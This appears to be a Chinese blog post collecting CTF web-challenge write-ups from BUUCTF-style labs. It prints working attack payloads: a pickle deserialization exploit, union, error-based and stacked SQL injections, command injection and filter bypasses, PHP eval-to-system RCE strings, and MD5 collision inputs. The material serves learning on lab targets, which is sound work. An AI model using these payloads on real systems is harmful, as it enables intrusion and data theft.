生成了phar.phar，改名为phar.png,上传并删除文件时抓包
![](https://img-blog.csdnimg.cn/20200317125805827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：
[ciscn2019华北赛区半决赛day1_web1题解](https://www.cnblogs.com/kevinbruce656/p/11316070.html)
[初探phar://](https://xz.aliyun.com/t/2715)

## [CISCN2019 华北赛区 Day1 Web2]ikun
鬼才出题人，kunkun应援团可还行！！！！
先找信息，有一个关键的为：**ikun们冲鸭,一定要买到lv6!!!**
![](https://img-blog.csdnimg.cn/20200317131046729.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
首先注册登录，然后去找lv6的账号，用python脚本跑
```python
import requests
url="http://922b9ddf-ebc4-468b-9671-597b2908778a.node3.buuoj.cn/shop?page="

for i in range(0,2000):

	r=requests.get(url+str(i))
	if 'lv6.png' in r.text:
		print (i)
		break
```
得到在page=181有lv6的账号
![](https://img-blog.csdnimg.cn/2020031713145146.png)
发现买不起，但可以在前端修改折扣，师傅称：薅羊毛逻辑漏洞
![](https://img-blog.csdnimg.cn/20200317131920438.png)
进入发现要admin才能访问
![](https://img-blog.csdnimg.cn/2020031713200057.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
看wp发现有为JWT漏洞：[认识JWT](https://www.cnblogs.com/cjsblog/p/9277677.html)
![](https://img-blog.csdnimg.cn/20200317132518992.png)
直接在网站[jwt.io](https://jwt.io)对JWT解密，要将username改为admin，需要key，这里要下载一个软件：[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
![](https://img-blog.csdnimg.cn/20200317133710867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
安装openssl的标头。在Ubuntu上，可以使用apt-get install libssl-dev，然后make一下就可以使用了
![](https://img-blog.csdnimg.cn/20200317140117680.png)
得到`1Kun`，即可更改JWT了
![](https://img-blog.csdnimg.cn/20200317141257993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
成功使用admin进入，查看源代码发现有友军已经进入，得到源码
![](https://img-blog.csdnimg.cn/2020031714155282.png)
在admin.py发现有pickle反序列化
![](https://img-blog.csdnimg.cn/20200410224036727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

**\_\_reduce\_\_()介绍：**
reduce它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。
这个元组包含2到5个元素，其中包括：
一个可调用的对象，用于重建对象时调用；
一个参数元素，供那个可调用对象使用；
被传递给 setstate 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）

使用师傅的脚本：
```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```
![](https://img-blog.csdnimg.cn/20200410223939765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到`c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.`
最后点击一键大会员修改become的值
![](https://img-blog.csdnimg.cn/20200410230031110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后得到flag
![](https://img-blog.csdnimg.cn/20200410230054983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[掘地三尺有神明：BUUCTF-WEB-[CISCN2019 华北赛区 Day1 Web2]ikun](https://blog.csdn.net/weixin_43345082/article/details/97817909)
[王叹之：[CISCN2019 华北赛区 Day1 Web2]ikun](https://www.cnblogs.com/wangtanzhi/p/12178311.html)
[W4nder：[CISCN2019 华北赛区 Day1 Web2]ikun](https://blog.csdn.net/chasingin/article/details/103891849)
## [极客大挑战 2019]Upload
做一个简单的上传。
某些情况下绕过后缀名检测：`php,php3,php4,php5,phtml.pht`
![](https://img-blog.csdnimg.cn/20200317151158287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
尝试了各种文件后，发现phtml可行，执行了php语句
![](https://img-blog.csdnimg.cn/20200317151257975.png)
蚁剑连接即可得到flag
![](https://img-blog.csdnimg.cn/20200317151512748.png)

## [SWPU2019]Web1
![](https://img-blog.csdnimg.cn/20200317173320339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
有一个登录框，试了试万能密码失败，那就注册吧
![](https://img-blog.csdnimg.cn/2020031717340670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
登录后发现有一个申请广告，在标题处输入11111111'，发现报错，应该是sql注入
![](https://img-blog.csdnimg.cn/20200317173911704.png)
禁用了or，空格等等，先使用union发现有22列
`-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22`
![](https://img-blog.csdnimg.cn/20200317174700872.png)
后面发现还可以用`-1'/**/group/**/by/**/22,'1`，一样可以爆出为22列
![](https://img-blog.csdnimg.cn/20200317202859789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看数据库：`-1'/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22`
![](https://img-blog.csdnimg.cn/2020031717482621.png)
接下来卡住了，看师傅wp，发现过滤了information_schema，使用师傅的payload：
```sql
-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```
![](https://img-blog.csdnimg.cn/20200317180349908.png)
接下来是无列名注入，举栗子说明一下:
先是正常的查询：`select * from users;`
![](https://img-blog.csdnimg.cn/20200317193516769.png)
一定要和表的列数相同 `select 1,2,3 union select * from users;`
![](https://img-blog.csdnimg.cn/20200317193853132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
若可用 ` 的话
```sql
select `3` from (select 1,2,3 union select * from users)a;
```
![](https://img-blog.csdnimg.cn/20200317194256663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
若不可用的话也可以用别名来代替
`select b from (select 1,2,3 as b union select * from users)a;`
![](https://img-blog.csdnimg.cn/20200317194549161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么即可构造payload如下
```sql
-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```
![](https://img-blog.csdnimg.cn/20200317180731559.png)
尝试另一个师傅的payload中使用`sys.schema_auto_increment_columns`和`sys.schema_table_statistics_with_buffer`发现都不存在，与环境有关吧
![](https://img-blog.csdnimg.cn/20200317201522800.png)
参考：
[mysql.innodb_table_stats](https://mariadb.com/kb/en/mysqlinnodb_table_stats/)
[聊一聊bypass information_schema](https://www.anquanke.com/post/id/193512)
[SWPUCTF 2019 web](https://www.cnblogs.com/tlbjiayou/p/12014926.html)

## [ASIS 2019]Unicorn shop
看不懂，查看wp
当我们的price超过9时，会出现一个提示
![](https://img-blog.csdnimg.cn/20200317203742318.png)
查看源码提示utf-8很重要。。。。。。
![](https://img-blog.csdnimg.cn/2020031720384531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
猜测只要购买了第四只独角兽，就能获取flag，于是我们需要找到一个字符比1337大的数字也就是utf-8编码的转换安全问题
在下面网站找到大于1337.0的字符即可：[Unicode](https://www.compart.com/en/unicode/)
这里我就找了和师傅一样的，~~实在不知道怎么找~~
![](https://img-blog.csdnimg.cn/20200317205841408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
**UTF-8 Encoding:	0xE1 0x8D 0xBC。将0x换为%即可**
传入`%E1%8D%BC`得到flag
![](https://img-blog.csdnimg.cn/20200317210022660.png)
参考：[[ASIS 2019]Unicorn shop](https://www.cnblogs.com/Cl0ud/p/12221360.html)


## [ACTF2020 新生赛]Include
~~看到新生赛，松了一大口气，终于能写了qaq~~
点击tips发现很明显的文件包含，伪协议即可
`?file=php://filter/read=convert.base64-encode/resource=flag.php`
![](https://img-blog.csdnimg.cn/20200317210505255.png)


## [安洵杯 2019]easy_web
**虽然我是萌新，但还是要说一句：真实**
![](https://img-blog.csdnimg.cn/2020031721074980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
url上面有cmd，可能是命令执行，随后就看了wp
解密img的参数：**base64->base64->hex**
![](https://img-blog.csdnimg.cn/20200317211552283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
为555.png，那么反推index.php,**hex->base64->base64**，最后再base64解码一次，即可得到index.php的源码
![](https://img-blog.csdnimg.cn/20200317212155842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
?>
```
发现为md5强碰撞，我之前写php时写过的，直接套用
```powershell
a=%90%2F%0B%11%0D%1A2%C8%04%C5%F4%14%D7%8D%AA%02vC%1F%0Fs%B4%0D%06%24%BE%7EM%97%22%92%DFd%F1%CB%F9L%2B%3BA%CB%05Dy%166%7D0%94%7E4g%5E%F0%8DZ%3Fu%CA%A4%CD%F09D%27%E8L%D1Z%40%B0%A8g%A4%C4%DCM%7D%EE%0A%82%8E%85L%11%86%16i%D1Z%7EG%EC%07%FEo%26e%C6%15%F2%CC%07%CE%A8km7%98%B8%85%2CD%29%2C%18%05V%96+W%E4%A3%1C%D1%F3%15%CD
b=%90%2F%0B%11%0D%1A2%C8%04%C5%F4%14%D7%8D%AA%02vC%1F%8Fs%B4%0D%06%24%BE%7EM%97%22%92%DFd%F1%CB%F9L%2B%3BA%CB%05Dy%16%B6%7D0%94%7E4g%5E%F0%8DZ%3Fu%CA%24%CD%F09D%27%E8L%D1Z%40%B0%A8g%A4%C4%DCM%7D%EE%0A%82%8E%85%CC%11%86%16i%D1Z%7EG%EC%07%FEo%26e%C6%15%F2%CC%07%CE%A8km7%988%85%2CD%29%2C%18%05V%96+W%E4%A3%9C%D1%F3%15%CD
```
得到的二进制hash值是一样的
![](https://img-blog.csdnimg.cn/20200317212958516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
先使用dir，发现没有什么有用的文件
![](https://img-blog.csdnimg.cn/20200317214531420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看根目录发现了flag，`dir%20/`**空格要url编码才可以**
![](https://img-blog.csdnimg.cn/20200317214717667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
cat被过滤了，可以用c\at来绕过`/bin/c\at%20/flag`
![](https://img-blog.csdnimg.cn/20200317215051875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
还可以用sort命令：`sort%20/flag`
sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。
![](https://img-blog.csdnimg.cn/20200317215347731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)


## [ACTF2020 新生赛]Exec

~~新生赛，舒服了~~，是一个命令执行
`127.0.0.1;ls`
![](https://img-blog.csdnimg.cn/20200318121608646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现只有index.php，那么查看根目录试试`127.0.0.1;ls /`
![](https://img-blog.csdnimg.cn/20200318121719887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
看到了flag，读取`127.0.0.1;cat /flag`
![](https://img-blog.csdnimg.cn/20200318122123594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

## [GXYCTF2019]禁止套娃

想不出来，去看wp，发现是/.git泄露
然后我的unbunt显示空仓库。。。。。在windows下载git指令
![](https://img-blog.csdnimg.cn/2020031813314366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
下载了好久，最后还是使用迅雷下载成功了，安装完成
![](https://img-blog.csdnimg.cn/2020031814413319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后发现是安装的githack有问题，安装了另一个[lijiejie/GitHack](https://github.com/lijiejie/GitHack)
成功得到index.php的源码
![](https://img-blog.csdnimg.cn/20200318152731384.png)
```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```
1. `if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp']))`
要求必须用data://,filter://,php://,phar://等伪协议
这样不可以用file://读取了。
2. `if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']))`
第二个正则关键在于\((?R)?\),(?R)表示引用当前表达式。
其中?引用是可选项,匹配成功后用NULL替换。
那么一个合法的表达式可以是`a(b();)`
3. `if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp']))`
正则匹配掉了et/na/info等关键字，很多函数都用不了

首先要得到目录下的文件，可用scandir()函数
![](https://img-blog.csdnimg.cn/20200318154024711.png)
那么就要构造`.`通过localeconv() 函数返回包含本地数字及货币信息格式的数组,而数组第一项就是`.`
current() 返回数组中的当前单元, 默认取第一个值，current还可以换成其同名函数pos
`?exp=print_r(scandir(pos(localeconv())));`
![](https://img-blog.csdnimg.cn/20200318154815615.png)
下面一步就是如何读取倒数第二个数组了：
### 方法一：array_flip()和array_rand()
**array_flip()交换数组的键和值。
array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php**
`?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));`
![](https://img-blog.csdnimg.cn/20200318155510914.png)
不断刷新读取flag
`?exp=highlight_file(array_rand(array_flip(scandir(pos(localeconv())))));`
![](https://img-blog.csdnimg.cn/20200318161234625.png)
### 方法二：array_reverse()
**array_reverse()以相反的元素顺序返回数组**
使用next可读取flag
`?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));`
![](https://img-blog.csdnimg.cn/20200318160227458.png)
或者`?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));`
再查看源码
![](https://img-blog.csdnimg.cn/20200318160841804.png)
### 方法三：使用session
通过session_start()告诉PHP使用session，php默认是不主动使用session的。
session_id()可以获取到当前的session id。
`?exp=print_r(session_id(session_start()));`
![](https://img-blog.csdnimg.cn/20200318162331589.png)
最后readfile：`?exp=readfile(session_id(session_start()));`
![](https://img-blog.csdnimg.cn/20200318162550934.png)
参考：
[【CTF Learning】禁止套娃--git泄漏+无参数利用绕正则](https://segmentfault.com/a/1190000021714035?utm_source=tag-newest)
[[GXYCTF2019]禁止套娃](https://www.cnblogs.com/wangtanzhi/p/12260986.html)

## [GXYCTF2019]BabySQli
查看源码得到search.php
![](https://img-blog.csdnimg.cn/2020031816285083.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
先base32后base64解码得
```sql
select * from user where username = '$name'
```
`1' union select 1,2,3#`爆出字段为3，后面不知道怎么做了，看wp
把admin 放到第二个位置 不报wrong user的错，username为字段二，password为字段三
`1' union select 1,'admin',3#`
**在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。**
![](https://img-blog.csdnimg.cn/2020031816471118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么我们随便传入只要用户名为admin,密码为md5加密的值即可
**aaa的md5：47bce5c74f589f4867dbd57e9ca9f808**传入：
username：`0' union select 1,'admin','47bce5c74f589f4867dbd57e9ca9f808'#`
password：`aaa`
![](https://img-blog.csdnimg.cn/20200318165314467.png)
## [CISCN 2019 初赛]Love Math
~~查看大佬wp后~~，给出源码如下
```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```
师傅写的太好了，照着学习，就写一下解题过程
### 思路一
`?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=ls`
![](https://img-blog.csdnimg.cn/20200318194250334.png)
往上翻文件夹在`../../../`找到flag，即为根目录，读取即可
`?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat ../../../flag`
![](https://img-blog.csdnimg.cn/20200318194405487.png)
另一种方法：
传`?$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})`
抓包加参数即可
![](https://img-blog.csdnimg.cn/20200320141415534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 思路二
**hex2bin()把十六进制值转换为 ASCII 字符**
**dechex()把十进制转换为十六进制**
构造：exec('cat /f*')，未成功
`?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(27973174078432810)))`
![](https://img-blog.csdnimg.cn/20200318200357253.png)
构造system('cat /*')
`?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211243818)))`
![](https://img-blog.csdnimg.cn/20200318200651459.png)
### 思路三
```php
<?php
$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
for($k=1;$k<=sizeof($payload);$k++){
    for($i = 0;$i < 9; $i++){
        for($j = 0;$j <=9;$j++){
            $exp = $payload[$k] ^ $i.$j;
            echo($payload[$k]."^$i$j"."==>$exp");
            echo "<br />";
        }
    }
}
```
使用fuzz脚本得到很长一串，找到我们需要构造的字符即可
![](https://img-blog.csdnimg.cn/20200318201159430.png)
is_nan^64==>_G
tan^15==>ET
`?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag`
![](https://img-blog.csdnimg.cn/20200318201738385.png)
参考：[刷题记录：[CISCN 2019 初赛]Love Math](https://www.cnblogs.com/20175211lyz/p/11588219.html)

## [极客大挑战 2019]HardSQL
过滤了and，=，空格，union等多个sql关键字,尝试报错注入
`username=admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=11111`
![](https://img-blog.csdnimg.cn/20200318202352751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到数据库geek
```sql
?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=11111
```
![](https://img-blog.csdnimg.cn/20200318203019124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到表名H4rDsq1
```sql
?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=11111
```
![](https://img-blog.csdnimg.cn/20200318203235948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到列名id，username，password
```sql
?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&password=11111
```
![](https://img-blog.csdnimg.cn/2020031820354376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
由于updatexml最多显示32的长度，要改为left()和right()来获取数据了
```sql
?username=admin'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&password=11111
```
![](https://img-blog.csdnimg.cn/20200318204045661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
拼接一起即可得到flag，这里还看到一个师傅的，可以使用异或代替or
`admin'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#`

## [GYCTF2020]Blacklist
这个题是之前堆叠注入的改编，禁用了rename，alter，但还是可以用handler来写
`1'; handler FlagHere open as y1ng; handler y1ng read first; handler y1ng close;#`
![](https://img-blog.csdnimg.cn/20200318230246871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [BJDCTF2020]Easy MD5
我试了试没想法，看wp发现要抓包看看
![](https://img-blog.csdnimg.cn/20200318230922287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
__Hint: select * from 'admin' where password=md5(\$pass,true)__
`ffifdyop` 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，Mysql 刚好又会吧 hex 转成 ascii这个字符串，前几位刚好是 `' or '6`，构造成万能密码
![](https://img-blog.csdnimg.cn/20200318231801982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看源码发现信息
```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```
